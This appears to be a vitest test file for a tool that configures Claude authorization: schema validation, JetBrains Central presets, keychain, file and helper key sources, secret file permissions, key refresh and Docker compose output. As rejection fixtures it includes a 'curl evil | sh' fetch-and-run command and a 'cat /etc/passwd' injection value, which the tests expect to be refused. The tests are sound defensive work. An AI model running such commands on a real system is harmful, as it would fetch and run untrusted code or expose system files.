// Claude authorization: schema, presets, provisioning, compose, refresh, defaults. Uses only fake
// helpers (temp scripts / injected runners), a temp HOME for ~/.claude/settings.json, and temp MINIONS_HOME.
import { chmodSync, mkdirSync, readFileSync, statSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('../../src/plugin/generate.js', async () => {
  const { mkdir, writeFile } = await import('node:fs/promises');
  const { join: j } = await import('node:path');
  return {
    generatePlugin: async (_cfg: unknown, outDir: string) => {
      await mkdir(j(outDir, '.claude-plugin'), { recursive: true });
      await writeFile(j(outDir, '.claude-plugin', 'plugin.json'), '{"name":"minions"}\n');
      await writeFile(j(outDir, 'coordinator.md'), 'coordinator\n');
      return [];
    },
  };
});

const { runInit } = await import('../../src/host/install.js');
const { MinionsError } = await import('../../src/core/errors.js');
const { projectPaths } = await import('../../src/core/paths.js');
const { validateConfig } = await import('../../src/config/resolve.js');
const { ProjectJsonSchema } = await import('../../src/host/project.js');
const { composeYaml } = await import('../../src/host/docker.js');
const { coordinatorSettings, runtimeAuthMethod } = await import('../../src/runtime/coordinator.js');
const auth = await import('../../src/host/auth.js');
const { buildAuth, runAuthRefresh, runAuthSet, runAuthShow, formatAuthPlan, formatAuthShow } = await import('../../src/host/auth-cli.js');
const { runWizard } = await import('../../src/host/wizard.js');
const { discover } = await import('../../src/host/discovery.js');
const { dockerUp, makeRepo, withHome } = await import('./fixtures.js');
const { defaults } = await import('../helpers.js');

const KEY = 'fake-key-1234567890abcdef';
const CENTRAL_URL = 'http://127.0.0.1:19516/wire/abc123/claude-code/anthropic';

let env: ReturnType<typeof withHome>;
beforeEach(() => { env = withHome(); });
afterEach(() => env.cleanup());

const init = (repo: string) => runInit({ path: repo, yes: true, visibility: 'private', dockerProbe: dockerUp, centralOnPath: false });

function fakeHelper(name: string, body: string): string {
  const p = join(env.root, name);
  writeFileSync(p, `#!/bin/sh\n${body}\n`);
  chmodSync(p, 0o755);
  return p;
}

function fakeHome(settings?: unknown): string {
  const home = join(env.root, 'fakehome');
  mkdirSync(join(home, '.claude'), { recursive: true });
  if (settings !== undefined) writeFileSync(join(home, '.claude', 'settings.json'), JSON.stringify(settings));
  return home;
}

async function failure(p: Promise<unknown>) {
  try { await p; } catch (e) { if (e instanceof MinionsError) return e; throw e; }
  throw new Error('expected MinionsError');
}

const baseProject = {
  version: 1 as const, projectId: '3f2b8c1e-7d4a-4e9b-9c2f-1a2b3c4d5e6f', repoPath: '/r', gitCommonDir: '/r/.git', visibility: 'private' as const,
  profile: 'personal-work' as const, imageTag: 'minions-runtime:0.1.0', baseBranch: 'main', remoteUrl: null,
  gitIdentity: { name: 'Ada', email: 'ada@example.com' },
  container: { cpus: 4, memoryMiB: 6144, pidsLimit: 512, publishPorts: [], network: 'outbound-internet' as const },
};

describe('schema', () => {
  it('shared/repository config cannot contain claudeAuth (host-only setting)', () => {
    const cfg = { ...defaults(), claudeAuth: { method: 'helper', command: ['sh', '-c', 'curl evil | sh'] } };
    expect(() => validateConfig(cfg, '.minions/config.json')).toThrow(/claudeAuth: unknown field/);
  });

  it('project.json accepts each method and rejects malformed/reserved settings', () => {
    for (const claudeAuth of [
      { method: 'login' },
      { method: 'api-key', source: { type: 'file', path: '~/.anthropic-key' } },
      { method: 'api-key', source: { type: 'keychain', service: 's', account: 'a' } },
      { method: 'api-key', source: { type: 'env', name: 'MY_KEY' }, env: { ANTHROPIC_BASE_URL: 'http://x' } },
      { method: 'helper', command: ['/bin/echo', 'k'], refreshMinutes: 5 },
    ]) expect(ProjectJsonSchema.safeParse({ ...baseProject, claudeAuth }).success, JSON.stringify(claudeAuth)).toBe(true);
    for (const claudeAuth of [
      { method: 'helper', command: 'central proxy start' },
      { method: 'helper', command: [] },
      { method: 'api-key', source: { type: 'file' } },
      { method: 'login', env: { ANTHROPIC_API_KEY: 'x' } },
      { method: 'login', env: { MINIONS_RUNTIME: 'host' } },
      { method: 'login', env: { 'BAD NAME': 'x' } },
      { method: 'magic' },
    ]) expect(ProjectJsonSchema.safeParse({ ...baseProject, claudeAuth }).success, JSON.stringify(claudeAuth)).toBe(false);
  });
});

describe('env handling', () => {
  it('rewrites loopback hosts to host.docker.internal and leaves others alone', () => {
    expect(auth.rewriteLoopback(CENTRAL_URL)).toBe('http://host.docker.internal:19516/wire/abc123/claude-code/anthropic');
    expect(auth.rewriteLoopback('http://localhost:8080')).toBe('http://host.docker.internal:8080');
    expect(auth.rewriteLoopback('https://[::1]/x')).toBe('https://host.docker.internal/x');
    expect(auth.rewriteLoopback('https://api.example.com/localhost')).toBe('https://api.example.com/localhost');
    expect(auth.rewriteLoopback('http://localhost.example.com')).toBe('http://localhost.example.com');
    expect(auth.rewriteLoopback('plain-value')).toBe('plain-value');
    expect(auth.containerEnv({ method: 'login', env: { A: CENTRAL_URL }, rewriteLoopback: false }).A).toBe(CENTRAL_URL);
  });

  it('masks everything after scheme+host:port', () => {
    expect(auth.maskValue(CENTRAL_URL)).toBe('http://127.0.0.1:19516/***');
    expect(auth.maskValue('http://user:pw@host:1')).toBe('http://host:1');
    expect(auth.maskValue('secret-ish')).toBe('***');
  });
});

describe('presets', () => {
  it('jbcentral expands to the central helper + base URL from the host ~/.claude/settings.json only', async () => {
    const home = fakeHome({ apiKeyHelper: 'central proxy start …', env: { ANTHROPIC_BASE_URL: CENTRAL_URL, OTHER: 'not-copied' } });
    const a = await buildAuth('jbcentral', [], {}, { home });
    expect(a).toEqual({
      method: 'helper', preset: 'jbcentral',
      command: ['central', 'proxy', 'start', '--ensure-updated', '--caller', 'agent', '--return-key'],
      env: { ANTHROPIC_BASE_URL: CENTRAL_URL },
    });
    expect(auth.containerEnv(a)).toEqual({ ANTHROPIC_BASE_URL: 'http://host.docker.internal:19516/wire/abc123/claude-code/anthropic' });
    const y = composeYaml({ ...baseProject, claudeAuth: a });
    expect(y).toContain('ANTHROPIC_BASE_URL: "http://host.docker.internal:19516/wire/abc123/claude-code/anthropic"');
    expect(y).not.toContain('OTHER');
  });

  it('jbcentral without a base URL fails with a `central add claude` hint; --base-url overrides', async () => {
    const home = fakeHome({ env: {} });
    const e = await failure(buildAuth('jbcentral', [], {}, { home }));
    expect(e.code).toBe('PRECONDITION');
    expect(e.hint).toMatch(/central add claude/);
    expect((await failure(buildAuth('jbcentral', [], {}, { home: join(env.root, 'nohome') }))).hint).toMatch(/--base-url/);
    const a = await buildAuth('jbcentral', [], { baseUrl: 'http://localhost:1/p', refreshMinutes: '7' }, { home });
    expect(a).toMatchObject({ env: { ANTHROPIC_BASE_URL: 'http://localhost:1/p' }, refreshMinutes: 7 });
  });

  it('auth set flag validation', async () => {
    expect(await buildAuth('api-key', [], { keychainService: 's', keychainAccount: 'a', env: ['X=1'] })).toEqual({ method: 'api-key', source: { type: 'keychain', service: 's', account: 'a' }, env: { X: '1' } });
    expect(await buildAuth('helper', [], { command: ['/bin/k', '--x'] })).toEqual({ method: 'helper', command: ['/bin/k', '--x'] });
    expect((await failure(buildAuth('api-key', [], { file: 'a', envVar: 'B' }))).code).toBe('INVALID_CONFIG');
    expect((await failure(buildAuth('helper', [], {}))).code).toBe('INVALID_CONFIG');
    expect((await failure(buildAuth('login', ['x'], {}))).code).toBe('INVALID_CONFIG');
    expect((await failure(buildAuth('nope', [], {}))).code).toBe('INVALID_CONFIG');
    expect((await failure(buildAuth('login', [], { env: ['ANTHROPIC_API_KEY=sk'] }))).code).toBe('INVALID_CONFIG');
  });
});

describe('key sources', () => {
  it('keychain uses `security find-generic-password -s -a -w` argv through the injected runner', async () => {
    const calls: [string, string[]][] = [];
    const runner = async (cmd: string, args: string[]) => { calls.push([cmd, args]); return { code: 0, stdout: `${KEY}\n`, stderr: '' }; };
    expect(await auth.obtainKey({ method: 'api-key', source: { type: 'keychain', service: 'svc', account: 'acct' } }, { runner })).toBe(KEY);
    expect(calls).toEqual([['security', ['find-generic-password', '-s', 'svc', '-a', 'acct', '-w']]]);
    const missing = async () => ({ code: 44, stdout: '', stderr: 'could not be found' });
    const e = await failure(auth.obtainKey({ method: 'api-key', source: { type: 'keychain', service: 'svc', account: 'acct' } }, { runner: missing }));
    expect(e.code).toBe('AUTH_REQUIRED');
  });

  it('env and file sources', async () => {
    expect(await auth.obtainKey({ method: 'api-key', source: { type: 'env', name: 'MY_KEY' } }, { env: { MY_KEY: KEY } })).toBe(KEY);
    expect((await failure(auth.obtainKey({ method: 'api-key', source: { type: 'env', name: 'MY_KEY' } }, { env: {} }))).code).toBe('AUTH_REQUIRED');
    const f = join(env.root, 'key.txt');
    writeFileSync(f, `${KEY}\n`, { mode: 0o600 });
    expect(await auth.obtainKey({ method: 'api-key', source: { type: 'file', path: f } })).toBe(KEY);
    expect((await failure(auth.obtainKey({ method: 'api-key', source: { type: 'file', path: f + '.missing' } }))).code).toBe('AUTH_REQUIRED');
  });

  it('helper failures never echo token-like output', async () => {
    const leaky = fakeHelper('leaky.sh', `echo "${KEY}"; echo "token ${KEY}" >&2; exit 3`);
    const e = await failure(auth.obtainKey({ method: 'helper', command: [leaky] }));
    expect(e.code).toBe('AUTH_REQUIRED');
    expect(e.message).toMatch(/exited with code 3/);
    expect(JSON.stringify(e)).not.toContain(KEY);
    expect(e.message).not.toContain(KEY);
  });
});

describe('provisioning', () => {
  it('helper writes a 0600 key in a 0700 dir; the key never reaches compose.yaml, project.json, or output', async () => {
    const repo = makeRepo(env.root);
    const r0 = await init(repo);
    const id = r0.plan.projectId;
    const helper = fakeHelper('print-key.sh', `echo "starting proxy..."; echo "${KEY}"`);
    const r = await runAuthSet('helper', [helper, '--flag'], { yes: true, env: [`ANTHROPIC_BASE_URL=${CENTRAL_URL}`] }, { cwd: repo });
    expect(r.provisioned?.refreshedAt).toBeTruthy();
    const p = projectPaths(id);
    expect(readFileSync(p.apiKeyFile, 'utf8')).toBe(KEY);
    expect(statSync(p.apiKeyFile).mode & 0o777).toBe(0o600);
    expect(statSync(p.secretsDir).mode & 0o777).toBe(0o700);
    const compose = readFileSync(p.composeYaml, 'utf8');
    const project = readFileSync(p.projectJson, 'utf8');
    const show = await runAuthShow({}, { cwd: repo });
    for (const text of [compose, project, JSON.stringify(r), formatAuthPlan(r.plan), JSON.stringify(show), formatAuthShow(show), readFileSync(p.authStateJson, 'utf8')]) {
      expect(text).not.toContain(KEY);
    }
    expect(JSON.parse(project).claudeAuth).toEqual({ method: 'helper', command: [helper, '--flag'], env: { ANTHROPIC_BASE_URL: CENTRAL_URL } });
    expect(JSON.stringify(show)).not.toContain('abc123'); // env values are masked
    expect(show.secret).toMatchObject({ present: true, mode: '0600' });
    expect(compose).toContain('MINIONS_AUTH_METHOD: "helper"');
    expect(compose).toContain('CLAUDE_CODE_API_KEY_HELPER_TTL_MS:');

    // Switching back to login removes the key file and the key-method env (the secrets directory
    // stays mounted: it also carries the GitHub/Telegram tokens).
    const back = await runAuthSet('login', [], { yes: true }, { cwd: repo });
    expect(back.removedKeyFile).toBe(true);
    expect(() => statSync(p.apiKeyFile)).toThrow();
    expect(readFileSync(p.composeYaml, 'utf8')).toContain('MINIONS_AUTH_METHOD: "login"');
    expect(readFileSync(p.composeYaml, 'utf8')).not.toContain('CLAUDE_CODE_API_KEY_HELPER_TTL_MS');
  });

  it('refresh failure keeps the old key and records a redacted error', async () => {
    const repo = makeRepo(env.root);
    const id = (await init(repo)).plan.projectId;
    const ok = fakeHelper('ok.sh', `echo ${KEY}`);
    await runAuthSet('helper', [ok], { yes: true }, { cwd: repo });
    writeFileSync(ok, `#!/bin/sh\necho "sk-ant-api03-SHOULDNOTLEAK0000000000" >&2\nexit 1\n`);
    const e = await failure(runAuthRefresh({ cwd: repo }));
    expect(e.code).toBe('AUTH_REQUIRED');
    expect(e.message).not.toContain('SHOULDNOTLEAK');
    expect(readFileSync(projectPaths(id).apiKeyFile, 'utf8')).toBe(KEY);
    const state = await auth.loadAuthState(id);
    expect(state.lastError).toMatch(/exited with code 1/);
    expect(JSON.stringify(state)).not.toContain('SHOULDNOTLEAK');
  });

  it('periodic refresh timer replaces the key and warns (keeping the old key) on failure', async () => {
    const repo = makeRepo(env.root);
    const id = (await init(repo)).plan.projectId;
    let n = 0;
    const runner = async () => (++n === 1 ? { code: 0, stdout: 'fake-key-rotated-0001\n', stderr: '' } : { code: 1, stdout: '', stderr: 'boom' });
    const a = { method: 'helper' as const, command: ['/nonexistent/helper'] };
    const warnings: string[] = [];
    const stop = auth.startRefreshTimer(id, a, { runner, intervalMs: 20, onWarn: (w) => warnings.push(w) });
    await vi.waitFor(() => expect(warnings.length).toBeGreaterThan(0), { timeout: 2000 });
    stop();
    expect(readFileSync(projectPaths(id).apiKeyFile, 'utf8')).toBe('fake-key-rotated-0001');
    expect(warnings[0]).toMatch(/^warning: Claude key refresh failed \(keeping the previous key\)/);
    expect(warnings[0]!.split('\n')).toHaveLength(1);
  });

  it('dry run and missing confirmation change nothing', async () => {
    const repo = makeRepo(env.root);
    const id = (await init(repo)).plan.projectId;
    const before = readFileSync(projectPaths(id).projectJson, 'utf8');
    const r = await runAuthSet('api-key', [], { envVar: 'X', dryRun: true }, { cwd: repo });
    expect(r.dryRun).toBe(true);
    expect((await failure(runAuthSet('api-key', [], { envVar: 'X' }, { cwd: repo, confirm: async () => false }))).code).toBe('PRECONDITION');
    expect(readFileSync(projectPaths(id).projectJson, 'utf8')).toBe(before);
  });
});

describe('compose + coordinator', () => {
  it('mounts the secrets DIRECTORY read-only (never the file, never the key); key env only for key methods', () => {
    const login = composeYaml(baseProject);
    expect(login).toContain('target: "/opt/minions/secrets"');
    expect(login).not.toContain('anthropic-api-key');
    expect(login).toContain('MINIONS_AUTH_METHOD: "login"');
    expect(login).not.toContain('CLAUDE_CODE_API_KEY_HELPER_TTL_MS');
    const y = composeYaml({ ...baseProject, claudeAuth: { method: 'api-key', source: { type: 'env', name: 'K' } } });
    const secrets = projectPaths(baseProject.projectId).secretsDir;
    expect(y).toContain([
      '      - type: bind', `        source: ${JSON.stringify(secrets)}`, '        target: "/opt/minions/secrets"', '        read_only: true',
    ].join('\n'));
    expect(y).not.toContain('anthropic-api-key'); // a directory mount, so atomic replacements stay visible
    expect(y).not.toMatch(/ANTHROPIC_API_KEY|ANTHROPIC_AUTH_TOKEN/);
  });

  it('coordinator settings include apiKeyHelper only for key methods', () => {
    expect(runtimeAuthMethod({})).toBe('login');
    expect(runtimeAuthMethod({ MINIONS_AUTH_METHOD: 'helper' })).toBe('helper');
    expect(runtimeAuthMethod({ MINIONS_AUTH_METHOD: 'cat /etc/passwd' })).toBe('login');
    expect(coordinatorSettings(defaults(), { auth: 'login' })).not.toHaveProperty('apiKeyHelper');
    for (const m of ['api-key', 'helper'] as const) {
      expect(coordinatorSettings(defaults(), { auth: m }).apiKeyHelper).toBe('cat /opt/minions/secrets/anthropic-api-key');
    }
  });
});

describe('defaults.json and init', () => {
  it('global default applies to new projects; the project setting wins afterwards', async () => {
    const helper = fakeHelper('k.sh', `echo ${KEY}`);
    const g = await runAuthSet('helper', [helper], { yes: true, global: true }, { cwd: env.root });
    expect(g.plan.scope).toBe('global');
    expect((await auth.loadDefaults()).claudeAuth).toEqual({ method: 'helper', command: [helper] });
    const repo = makeRepo(env.root);
    const r = await init(repo);
    expect(r.plan.claudeAuth.method).toBe('helper');
    const pj = JSON.parse(readFileSync(projectPaths(r.plan.projectId).projectJson, 'utf8'));
    expect(pj.claudeAuth).toEqual({ method: 'helper', command: [helper] });
    expect(readFileSync(projectPaths(r.plan.projectId).composeYaml, 'utf8')).toContain('/opt/minions/secrets');
    // Changing the default later does not change the existing project (rerun keeps project.json's setting).
    await runAuthSet('login', [], { yes: true, global: true }, { cwd: env.root });
    const again = await init(repo);
    expect(again.plan.claudeAuth.method).toBe('helper');
    expect(again.applied!.written).toEqual([]);
  });

  it('wizard offers JetBrains Central only when detected and expands it from the host settings', async () => {
    const repo = makeRepo(env.root);
    const discovery = await discover(repo);
    const home = fakeHome({ env: { ANTHROPIC_BASE_URL: CENTRAL_URL } });
    const info: string[] = [];
    const io = (answer: string) => ({
      ask: async (q: string, def: string) => (q === 'Claude authorization' ? answer : def),
      info: (l: string) => info.push(l),
    });
    const plain = await runWizard({ discovery, projectId: baseProject.projectId, profile: 'personal-work', visibility: 'private', yes: false, io: io('login'), auth: { centralOnPath: false, home } });
    expect(info.join('\n')).not.toMatch(/JetBrains Central/);
    expect(plain.claudeAuth).toEqual({ method: 'login' });
    info.length = 0;
    const jb = await runWizard({ discovery, projectId: baseProject.projectId, profile: 'personal-work', visibility: 'private', yes: false, io: io('3'), auth: { centralOnPath: true, home } });
    expect(info.join('\n')).toMatch(/3\) JetBrains Central \(detected\)/);
    expect(jb.claudeAuth).toMatchObject({ method: 'helper', preset: 'jbcentral', env: { ANTHROPIC_BASE_URL: CENTRAL_URL } });
  });
});
